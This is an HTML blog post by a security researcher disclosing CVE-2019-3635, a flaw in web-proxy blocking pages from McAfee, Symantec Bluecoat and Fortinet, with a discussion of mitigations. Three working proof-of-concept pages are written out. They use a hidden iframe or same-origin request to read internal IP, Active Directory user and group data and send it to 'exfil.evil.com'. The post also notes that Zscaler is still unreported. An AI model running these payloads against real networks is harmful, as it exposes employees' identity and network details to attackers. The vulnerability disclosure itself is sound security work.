@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en" data-theme=""><head>
+    <title> Zezadas | How to exfiltrate internal information using web proxies. </title>
+    <meta charset="utf-8"><meta name="generator" content="Hugo 0.74.3" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="description" content="Organic hacker, sharing Bio and healthy hacks. &lt;br&gt; Supporter of charity cause: **helping noobs to exit vim** &lt;br&gt; - because everyone deserves a chance to write and quit">
+    
+    <link rel="stylesheet" href="https://sefod.eu/css/style.min.9e9eeb1dcf12b8487b49e872cf3db0c9493d2bc8b8fd7422f96d8a331d82eae6.css" integrity="sha256-np7rHc8SuEh7Sehyzz2wyUk9K8i4/XQi&#43;W2KMx2C6uY=" crossorigin="anonymous" type="text/css">
+    <link rel="stylesheet" href="https://sefod.eu/css/shadow.min.3e8467e8623033788edd49e3b09a113a06a90438ee1b1a601cd2c7951f5fdf8f.css" integrity="sha256-PoRn6GIwM3iO3UnjsJoROgapBDjuGxpgHNLHlR9f348=" crossorigin="anonymous" type="text/css"><link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    
+    <link rel="shortcut icon" href="https://sefod.eu/favicons/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://sefod.eu/favicons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://sefod.eu/favicons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://sefod.eu/favicons/favicon-16x16.png">
+    <link rel="canonical" href="https://sefod.eu/post/web_proxies/">
+    
+    
+    <script type="text/javascript" src="https://sefod.eu/js/anatole-header.min.7e2fc0724240b28c6e214687e73a4a6eb6c196bbace546b9dc86e94cca120b5c.js" integrity="sha256-fi/AckJAsoxuIUaH5zpKbrbBlrus5Ua53IbpTMoSC1w=" crossorigin="anonymous"></script>
+    <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://sefod.eu/images/site-feature-image.png"/>
+
+<meta name="twitter:title" content="How to exfiltrate internal information using web proxies."/>
+<meta name="twitter:description" content="A walk through I discovered and exploited an CVE and the State Of Art on other vendors"/>
+
+</head><body><div class="sidebar animated fadeInDown">
+    <div class="logo-title">
+      <div class="title">
+        <img src="https://avatars0.githubusercontent.com/u/1704139" alt="profile picture">
+        <h3 title=""><a href="/">I&#39;m Zezadas</a></h3>
+        <div class="description">
+          <p>Organic hacker, sharing Bio and healthy hacks. <br> Supporter of charity cause: <strong>helping noobs to exit vim</strong> <br> - because everyone deserves a chance to write and quit</p>
+        </div>
+      </div>
+    </div>
+    <ul class="social-links">
+        
+        <li>
+        <a href="https://www.linkedin.com/in/zezadas" rel="me" aria-label="Linkedin">
+          <i class="fa fa-2x fa-linkedin" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="https://github.com/zezadas" rel="me" aria-label="GitHub">
+          <i class="fa fa-2x fa-github" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="https://twitter.com/intent/follow?screen_name=0xz3z4d45" rel="me" aria-label="twitter">
+          <i class="fa fa-2x fa-twitter" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="mailto:lixeira@sefod.eu" rel="me" aria-label="e-mail">
+          <i class="fa fa-2x fa-envelope" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+    </ul>
+    <div class="footer">
+        <div class="by_farbox">&copy; Zezadas 2020 </div>
+      </div>
+    </div>
+</div>
+<div class="main">
+            <div class="page-top animated fadeInDown">
+    <a role="button" class="navbar-burger" data-target="navMenu" aria-label="menu" aria-expanded="false" >
+        <span aria-hidden="true"></span>
+        <span aria-hidden="true"></span>
+        <span aria-hidden="true"></span>
+      </a>
+    <ul class="nav" id="navMenu">
+        
+        
+        
+        <li><a  href="/" title="">Home</a></li>
+        
+        
+        <li><a  href="/post/" title="">Posts</a></li>
+        
+        
+        <li><a  href="/about/" title="">About</a></li>
+        
+        
+        <li class="theme-switch-item">
+        <a class="theme-switch" title="Switch Theme">
+            <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+        </a>
+        </li>
+    </ul>
+</div>
+
+            <div class="autopagerize_page_element">
+                <div class="content">
+<div class="post animated fadeInDown">
+    <div class="post-content">
+
+      <div class="post-title">
+        <h3>How to exfiltrate internal information using web proxies.
+        </h3>
+        
+        <div class="info">
+          <i class="fa fa-sun-o"></i>
+          <span class="date">Fri, Aug 14, 2020</span>
+          <i class="fa fa-clock-o"></i><span class="reading-time">6-minute read</span>
+        </div>
+        
+        </div>
+
+    <p>Security Products, are not always secure. In the case of web proxies, there are some considerations to have into account when developing this kind of tool.<br>
+I have been lazy to write about this but here it comes.
+This write-up comes about a cross-frame scripting vulnerability that I reported to McAfee that resulted in <a href="https://kc.mcafee.com/corporate/index?page=content&amp;id=SB10293">CVE-2019-3635</a>. I&rsquo;ve also reported this vulnerability to two other vendors which got answered by the technical support team.  I&rsquo;ve also sucesfully tested the same procedure in another vendor, but due to the lack of time is yet to be reported and therefore still exploitable.</p>
+<hr>
+<h2 id="whats-this-about">What’s this about?</h2>
+<p>Several vendors sell solutions to secure the network from unintended content such as downloading malware or visiting dangerous websites.<br>
+Each vendor calls a different name to their product, but it’s basically a proxy that intercepts the HTTP packets, and based on filtering rules it will replace the dangerous content by a WARNING page.</p>
+<h2 id="so-far-so-good-but-whats-wrong-with-that">So far so good. But what&rsquo;s wrong with that?</h2>
+<p>Let’s check the McAfee Web Gateway output when opening an EICAR file.<br>
+The <a href="https://www.eicar.org/?page_id=3950">EICAR</a> is like a smoke test for Anti-Virus. It&rsquo;s a sequence of non malicious characters that every Anti-Virus flag as dangerous.</p>
+<img class="shadow" src="/images/web_proxies/mcafee.png" width="550">
+<p>At this point, as you can see there is a lot of sensitive information being displayed on the blocking message (let&rsquo;s call it “blocking message”).<br>
+It means that every time you try to open a malicious page inside a network, you get same “protected” webpage rendered by the enterprise proxy, which includes all this detailed information.<br></p>
+<p>Since I’ve worked on projects involving testing and evaluating phishing campaigns, I thought how cool it could be to have this information as evaluation metrics. Take a few moments to look at all of this beautiful data: Internal IP, Proxy IP, Active Directory User name, Active Directory Groups… Juicy stuff.<br></p>
+<p>Since I din’t want to invest much time, the easiest way for me to exfiltrate this information was to use an iframe.</p>
+<p>Therefore I created a POC page containing an iframe pointing to an EICAR page (it has to be on the same domain, which I will explain later).</p>
+<img class="shadow" src ="/images/web_proxies/poc.png" width="550">
+<p>Now that the iframe is loaded on the page, let&rsquo;s get its content using javascript.</p>
+<img class="shadow" src="/images/web_proxies/poc_devconsole.png" width="550">
+<p>The final touch is to automate it. In conclusion, the main page embeds an iframe that will contain the blocking message displaying all the sensitive data; then, the regular page will retrieve the iframe content using javascript and exfiltrate it to a server of ours.</p>
+<p>An example of the extracted information using javascript:</p>
+<img class="shadow" src="/images/web_proxies/exfil.png" width="550">
+<h2 id="what-about-iframe-security">What about iframe security?</h2>
+<p>You may be wondering, but… since the proxy is just replacing the HTTP reply, that “blocking message” is part of the same page that is on the same domain, which means that you <strong>can</strong> access iframe content via JavaScript.</p>
+<h2 id="heres-the-poc">Here’s the POC:</h2>
+<div >
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+   &lt;<span style="color:#f92672">body</span>&gt;
+      &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+      &lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;evilframe&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display:none&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;eicar.txt&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+      &lt;<span style="color:#f92672">h1</span>&gt;WEB PROXY USER INFO&lt;/<span style="color:#f92672">h1</span>&gt;
+      &lt;<span style="color:#f92672">p</span>&gt;You must be serving eicar.txt with malicious content.&lt;/<span style="color:#f92672">p</span>&gt;
+      &lt;<span style="color:#f92672">br</span>&gt;
+      &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pwn()&#34;</span>&gt;Read user info&lt;/<span style="color:#f92672">button</span>&gt;
+      &lt;<span style="color:#f92672">script</span>&gt;
+         <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">pwn</span>() {
+             <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;evilframe&#34;</span>).<span style="color:#a6e22e">contentWindow</span>.document.<span style="color:#a6e22e">children</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">textContent</span>;
+             <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">info</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">content</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#a6e22e">content</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;INFORMATION INTENDED TO SUPPORT:&#34;</span>), <span style="color:#a6e22e">content</span>.<span style="color:#a6e22e">length</span>).<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\n&#34;</span>);
+             <span style="color:#a6e22e">info</span>.<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">i</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">i</span>));
+             document.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">info</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">info</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">info</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">info</span>[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">info</span>[<span style="color:#ae81ff">5</span>]);
+             <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>({
+                <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;POST&#39;</span>,
+                <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;http://exfil.evil.com/exfil&#34;</span>,
+                <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span><span style="color:#a6e22e">info</span>.<span style="color:#a6e22e">toString</span>(),
+                <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">i</span>){
+                    <span style="color:#66d9ef">return</span>;
+                }
+         });
+         }
+      &lt;/<span style="color:#f92672">script</span>&gt;
+   &lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;</code></pre></div>
+<div>
+<h2 id="what-about-other-vendors-lets-check-bluecoat-from-symantec">What about other vendors? Let’s check Bluecoat from Symantec.</h2>
+<p>Different vendors follow the same implementation ideas, therefore the vulnerability is also present.</p>
+<img class="shadow" src="/images/web_proxies/symantec.png" width="550">
+<h2 id="poc">POC:</h2>
+<p>The payload is slightly different, but follows the same principles. POC for this case is the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+   &lt;<span style="color:#f92672">body</span>&gt;
+      &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+      &lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;BigCompany&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display:none&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;eicar.txt&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+      &lt;<span style="color:#f92672">h1</span>&gt;SYMANTEC WEB PROXY USER INFO&lt;/<span style="color:#f92672">h1</span>&gt;
+      &lt;<span style="color:#f92672">br</span>&gt;
+      &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pwn()&#34;</span>&gt;PWN!!&lt;/<span style="color:#f92672">button</span>&gt;
+      &lt;<span style="color:#f92672">script</span>&gt;
+         <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">pwn</span>(){
+             <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">conteudo</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;BigCompany&#34;</span>).<span style="color:#a6e22e">contentWindow</span>.document.<span style="color:#a6e22e">children</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">textContent</span>;
+             <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">info</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">conteudo</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#a6e22e">conteudo</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;BigCompany blocks access to this site due to its categorization or other potential HR, Legal or Security risk(s).&#34;</span>),<span style="color:#a6e22e">conteudo</span>.<span style="color:#a6e22e">length</span>).<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\n&#34;</span>);
+             <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>({
+             <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;POST&#39;</span>,
+             <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;http://exfil.evil.com/exfil&#34;</span>,
+             <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span><span style="color:#a6e22e">info</span>.<span style="color:#a6e22e">toString</span>(),
+             <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">i</span>){
+                 <span style="color:#66d9ef">return</span>;
+                 }
+             });
+         
+             <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;PWNED!!&#34;</span>);
+             <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">info</span>[<span style="color:#ae81ff">1</span>]);
+             <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">info</span>[<span style="color:#ae81ff">2</span>]);
+             <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">info</span>[<span style="color:#ae81ff">3</span>]);
+             <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">info</span>[<span style="color:#ae81ff">4</span>]);
+             <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">info</span>[<span style="color:#ae81ff">5</span>]);
+             <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;EOP&#34;</span>);
+             document.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#34;&lt;html&gt;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">info</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">info</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">info</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">info</span>[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/html&gt;&#34;</span>);
+         }
+      &lt;/<span style="color:#f92672">script</span>&gt;
+   &lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;</code></pre></div>
+<h2 id="any-more-vendors-lets-see-fortiguard-from-fortinet">Any more vendors? Let’s see Fortiguard from Fortinet.</h2>
+<p>In contrast, other vendors may have different solutions. This is the case of Fortiguard:</p>
+<img class="shadow" src="/images/web_proxies/fortinet.png" width="550">
+<h2 id="whats-the-difference">What’s the difference?</h2>
+<p>Fortinet does reply with HTTP security headers:</p>
+<ul>
+<li><strong>X-Frame-Options</strong>: SAMEORIGIN</li>
+<li><strong>X-XSS-Protection</strong>: 1; mode=block</li>
+<li><strong>X-Content-Type-Options</strong>: nosniff</li>
+<li><strong>Content-Security-Policy</strong>: frame-ancestors</li>
+</ul>
+<p>Which means that the iframe can&rsquo;t be embedded because of <strong>Content-Security-Policy: frame-ancestors</strong> that not defining any value it blocks by default.<br>
+Browser reports:</p>
+<h4 id="heading"></h4>
+<blockquote>
+<p>Content Security Policy: The page’s settings blocked the loading of a resource at http://192.168.1.231:8000/pwn.html (“frame-ancestors”).</p>
+</blockquote>
+<img class="shadow" src="/images/web_proxies/fortinet_blocked.png" width="550">
+<h2 id="how-can-it-be-bypassed">How can it be bypassed?</h2>
+<p>XML HTTP Request to the rescue!!<br>
+By default, XML HTTP Requests are not allowed cross-domain, unless specified on HTTP Headers with **Cross-Origin Resource Sharing.**<br>
+However on the same domain, it is allowed, and as I explained before since the blocking message is a response from a request to the same domain, it is allowed.</p>
+<img class="shadow" src="/images/web_proxies/fortinet_xhr.png" width="550">
+<h2 id="exfil-done">Exfil done.</h2>
+<img class="shadow" src="/images/web_proxies/fortinet_exfil.png" width="550">
+<h2 id="poc-1">POC:</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+   &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://code.jquery.com/jquery-3.4.1.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+   &lt;<span style="color:#f92672">body</span>&gt;
+      &lt;<span style="color:#f92672">h1</span>&gt;WEB PROXY USER INFO&lt;/<span style="color:#f92672">h1</span>&gt;
+      &lt;<span style="color:#f92672">p</span>&gt;You must be serving eicar.txt with malicious content.&lt;/<span style="color:#f92672">p</span>&gt;
+      &lt;<span style="color:#f92672">br</span>&gt;
+      &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pwn()&#34;</span>&gt;Read user info&lt;/<span style="color:#f92672">button</span>&gt;
+      &lt;<span style="color:#f92672">script</span>&gt;
+         <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">pwn</span>() {
+         <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">get</span>( <span style="color:#e6db74">&#34;/eicar.txt&#34;</span>, <span style="color:#66d9ef">function</span>( <span style="color:#a6e22e">data</span> ) {
+         <span style="color:#a6e22e">alert</span>( <span style="color:#e6db74">&#34;Data Loaded: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">data</span> );
+         }).<span style="color:#a6e22e">fail</span>(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>) {
+         <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">msg</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">responseText</span>;
+         <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\n&#34;</span>)[<span style="color:#ae81ff">1</span>]);
+         <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">info</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">content</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#a6e22e">content</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;&lt;h1&gt;&#34;</span>),<span style="color:#a6e22e">content</span>.<span style="color:#a6e22e">length</span>);
+         <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">info</span>);
+               <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>({
+            <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;POST&#39;</span>,
+            <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;http://exfil.evil.com/exfil&#34;</span>,
+            <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span><span style="color:#a6e22e">info</span>.<span style="color:#a6e22e">toString</span>(),
+            <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">i</span>){
+                <span style="color:#66d9ef">return</span>;
+                }
+            });
+         });
+         }
+      &lt;/<span style="color:#f92672">script</span>&gt;
+   &lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;</code></pre></div>
+<h2 id="epiphany">Epiphany:</h2>
+<p>At this point, I realized that I could have used the XML HTTP Request on the previous scenarios. I don&rsquo;t know if it possible, but at least it will be challenging to block XML HTTP Request on the same domain.</p>
+<h2 id="secure-vendors-and-possible-mitigations">Secure vendors and possible mitigations:</h2>
+<p>I&rsquo;ve also tested Checkpoint and it appears to be secure.
+In contrast with other vendors, Checkpoint solution doesn&rsquo;t replace the content by the blocking messgae, it replaces it by an HTTP redirect, which redirects to another domain with all the Secure HTTP headers. At this point iframes and XML HTTP Requests are not possible anymore.<br>
+Of course, it is always possible to infer that a user is using some kind of web filtering solution because if we control the content on a domain, we just need to check if that content was loaded and it was the expected content. For example: main page does a XML HTTP Request to a file hosted on the same domain containing a EICAR or a malicious file. If the response to the XML HTTP Request is not the same file that was hosted, then it means that some web filter did replaced the content.<br>
+On an advanced level patterns can be used, not all vendor block the same contents, and that can be used to infer what solution is being used. For example: Mcafee does not block the same domain that Symantec blocks, neither Fortinet blocks the same files that Checkpoint blocks.<br>
+This patterns can be used to infer the solution&rsquo;s vendor on that network.</p>
+<h2 id="conclusion">Conclusion:</h2>
+<p>McAfee acknowledged the vulnerability and created an advisory.<br>
+I reported the same vulnerability on FortiGuard and Symantec, but unfortunately they didn’t manage to understand/reproduce using the same steps.<br>
+I&rsquo;ve found the same vulnerability on Zscaler, but didn&rsquo;t manage to have the time to report the issue properly.<br>
+Although some vendors can argue that the blocking message is not providing any sensitive information (yet), those messages can be customized and include sensitive information within a network.<br>
+On top of that, all these vectors will work better if your domains are flagged as malicious. Luckily my two domains got mixed results, which was cool for testing this on multiple vendors.</p>
+<p>Are enterprise proxies securing you or exposing you?</p>
+
+    </div>
+    <div class="post-footer">
+      <div class="info">
+        
+<span class="separator"><a class="category" href="/categories/web/">web</a><a class="category" href="/categories/exfil/">exfil</a></span>
+
+        
+    <span class="separator"><a class="tag" href="/tags/web/">web</a><a class="tag" href="/tags/cve-2019-3635/">CVE-2019-3635</a><a class="tag" href="/tags/mcafee/">McAfee</a><a class="tag" href="/tags/symantec/">Symantec</a><a class="tag" href="/tags/fortinet/">Fortinet</a><a class="tag" href="/tags/zscaler/">Zscaler</a></span>
+
+      </div>
+    </div>
+
+    
+           
+    
+</div>
+
+
+                </div>
+            </div>
+        </div>
+</body>
+
+
+
+<script type="text/javascript" src="https://sefod.eu/js/jquery.min.86b1e8f819ee2d9099a783e50b49dff24282545fc40773861f9126b921532e4c.js" integrity="sha256-hrHo&#43;BnuLZCZp4PlC0nf8kKCVF/EB3OGH5EmuSFTLkw=" crossorigin="anonymous"></script>
+
+
+
+
+<script type="text/javascript" src="https://sefod.eu/js/bundle.min.0f9c74cb78f13d1f15f33daff4037c70354f98acfbb97a6f61708966675c3cae.js" integrity="sha256-D5x0y3jxPR8V8z2v9AN8cDVPmKz7uXpvYXCJZmdcPK4=" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="https://sefod.eu/js/medium-zoom.min.92f21c856129f84aeb719459b3e6ac621a3032fd7b180a18c04e1d12083f8aba.js" integrity="sha256-kvIchWEp&#43;ErrcZRZs&#43;asYhowMv17GAoYwE4dEgg/iro=" crossorigin="anonymous"></script></html></body>
+
+</html>
